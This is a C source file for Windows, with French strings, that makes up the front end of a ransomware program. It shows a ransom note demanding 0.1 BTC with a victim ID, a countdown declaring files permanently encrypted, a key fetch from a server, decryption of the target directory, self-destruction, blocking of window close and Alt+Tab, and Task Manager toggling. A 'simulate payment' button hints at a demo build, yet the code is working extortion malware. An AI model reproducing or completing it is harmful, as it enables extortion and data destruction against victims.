#include "main.h"

// Mise à jour du compte à rebours
void UpdateCountdown(HWND hwnd, time_t end_time) {
    time_t now = time(NULL);
    if (now >= end_time) {
        wchar_t* text = L"TEMPS ÉCOULÉ! VOS FICHIERS SONT CHIFFRÉS DÉFINITIVEMENT!";
        SetWindowTextW(g_timer_label, text);
        InvalidateRect(g_timer_label, NULL, TRUE);
        UpdateWindow(g_timer_label);
        KillTimer(hwnd, 1);
        return;
    }

    time_t remaining = end_time - now;
    int hours = remaining / 3600;
    int minutes = (remaining % 3600) / 60;
    int seconds = remaining % 60;

    wchar_t text[100];
    swprintf(text, 100, L"TEMPS RESTANT: %02d:%02d:%02d", hours, minutes, seconds);
    SetWindowTextW(g_timer_label, text);
    InvalidateRect(g_timer_label, NULL, TRUE);
    UpdateWindow(g_timer_label);
}

// Vérification du statut du paiement
void CheckPaymentStatus(HWND hwnd) {
    if (g_payment_checked) return; // Déjà vérifié

    static int check_count = 0;
    check_count++;

    // Après quelques vérifications, on vérifie avec le serveur
    if (check_count > 5) {
        uint8_t server_key[crypto_aead_chacha20poly1305_IETF_KEYBYTES];

        // Essayer de récupérer la clé du serveur
        if (HTTP_GET(g_uuid, server_key, sizeof(server_key))) {
            KillTimer(hwnd, 1); // Arrêter le compte à rebours
            KillTimer(hwnd, 2); // Arrêter les vérifications de paiement
            g_payment_checked = 1;

            SetWindowTextW(g_label, L"PAIEMENT VÉRIFIÉ!");
            SetWindowTextW(g_timer_label, L"DÉCHIFFREMENT EN COURS...");
            InvalidateRect(g_label, NULL, TRUE);
            InvalidateRect(g_timer_label, NULL, TRUE);
            UpdateWindow(g_label);
            UpdateWindow(g_timer_label);

            if (g_encrypted) {
                DecryptDirectory(TARGET_DIR, server_key);
                g_encrypted = 0;
            }

            MessageBoxW(hwnd, L"Les fichiers ont été déchiffrés avec succès.", L"Succès", MB_OK | MB_ICONINFORMATION);
            SetWindowTextW(g_timer_label, L"TOUS LES FICHIERS RESTAURÉS!");
            InvalidateRect(g_timer_label, NULL, TRUE);
            UpdateWindow(g_timer_label);

            // Auto-destruction après 3 secondes
            SetTimer(hwnd, 3, 3000, NULL);
        } else {
            // Mettre à jour le texte de statut - pas encore de paiement
            wchar_t status[512];
            wchar_t uuid_wide[64];
            MultiByteToWideChar(CP_ACP, 0, g_uuid, -1, uuid_wide, 64);

            swprintf(status, 512,
                     L"Vos fichiers ont été chiffrés avec un chiffrement militaire.\n\n"
                     L"Pour récupérer vos fichiers, envoyez 0.1 BTC à l'adresse suivante:\n"
                     L"%hs\n\n"
                     L"Votre ID de déchiffrement unique: %s\n\n"
                     L"En attente du paiement... (Vérification #%d)",
                     PAYMENT_ADDRESS, uuid_wide, check_count);
            SetWindowTextW(g_info, status);
            InvalidateRect(g_info, NULL, TRUE);
            UpdateWindow(g_info);
        }
    } else {
        // Mettre à jour le texte de statut avant les vérifications avec le serveur
        wchar_t status[512];
        wchar_t uuid_wide[64];
        MultiByteToWideChar(CP_ACP, 0, g_uuid, -1, uuid_wide, 64);

        swprintf(status, 512,
                 L"Vos fichiers ont été chiffrés avec un chiffrement militaire.\n\n"
                 L"Pour récupérer vos fichiers, envoyez 0.1 BTC à l'adresse suivante:\n"
                 L"%hs\n\n"
                 L"Votre ID de déchiffrement unique: %s\n\n"
                 L"En attente du paiement... (Vérification #%d)",
                 PAYMENT_ADDRESS, uuid_wide, check_count);
        SetWindowTextW(g_info, status);
        InvalidateRect(g_info, NULL, TRUE);
        UpdateWindow(g_info);
    }
}

// Procédure de fenêtre principale
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HBRUSH hBackBrush = NULL;
    static BOOL readyToExit = FALSE;

    switch (msg) {
        case WM_CREATE:
            hBackBrush = CreateSolidBrush(RGB(25, 25, 25)); // Fond sombre
            break;

        case WM_TIMER:
            if (wParam == 1) {
                UpdateCountdown(hwnd, g_end_time);
            } else if (wParam == 2) {
                CheckPaymentStatus(hwnd);
            } else if (wParam == 3) {
                // Timer pour auto-destruction
                KillTimer(hwnd, 3);
                SelfDestruct();
                DestroyWindow(hwnd);
            }
            break;

        case WM_COMMAND:
            if (LOWORD(wParam) == 1001) { // Bouton de simulation de paiement
                g_payment_checked = 1;
                KillTimer(hwnd, 1);
                KillTimer(hwnd, 2);
                SetWindowTextW(g_label, L"PAIEMENT VÉRIFIÉ!");
                SetWindowTextW(g_timer_label, L"DÉCHIFFREMENT EN COURS...");
                InvalidateRect(g_label, NULL, TRUE);
                InvalidateRect(g_timer_label, NULL, TRUE);
                UpdateWindow(g_label);
                UpdateWindow(g_timer_label);

                if (g_encrypted) {
                    DecryptDirectory(TARGET_DIR, g_key);
                    g_encrypted = 0;
                }

                MessageBoxW(hwnd, L"Les fichiers ont été déchiffrés avec succès.\nSimulation terminée.",
                           L"Succès", MB_OK | MB_ICONINFORMATION);
                SetWindowTextW(g_timer_label, L"TOUS LES FICHIERS RESTAURÉS!");
                InvalidateRect(g_timer_label, NULL, TRUE);
                UpdateWindow(g_timer_label);

                SetTimer(hwnd, 3, 3000, NULL);
                readyToExit = TRUE;
            }
            break;

        case WM_HOTKEY:
            // Bloquer Alt+Tab
            return 0;

        case WM_CTLCOLORSTATIC:
            // Couleurs pour les contrôles statiques
            if ((HWND)lParam == g_label) {
                SetTextColor((HDC)wParam, RGB(255, 0, 0)); // Rouge
                SetBkMode((HDC)wParam, TRANSPARENT);
                return (LRESULT)hBackBrush;
            } else if ((HWND)lParam == g_info) {
                SetTextColor((HDC)wParam, RGB(220, 220, 220)); // Gris clair
                SetBkMode((HDC)wParam, TRANSPARENT);
                return (LRESULT)hBackBrush;
            } else if ((HWND)lParam == g_timer_label) {
                SetTextColor((HDC)wParam, RGB(255, 255, 0)); // Jaune
                SetBkMode((HDC)wParam, TRANSPARENT);
                return (LRESULT)hBackBrush;
            }
            break;

        case WM_CTLCOLORBTN:
            SetBkMode((HDC)wParam, TRANSPARENT);
            return (LRESULT)GetStockObject(WHITE_BRUSH);

        case WM_CLOSE:
            if (!g_payment_checked && g_fullscreen) {
                MessageBoxW(hwnd, L"Vous ne pouvez pas fermer cette fenêtre avant paiement.",
                          L"Attention", MB_OK | MB_ICONWARNING);
                return 0;
            }
            break;

        case WM_DESTROY:
            if (hBackBrush) DeleteObject(hBackBrush);

            // Restaurer les paramètres système
            DisableTaskManager(FALSE);

            CleanupMutex();
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}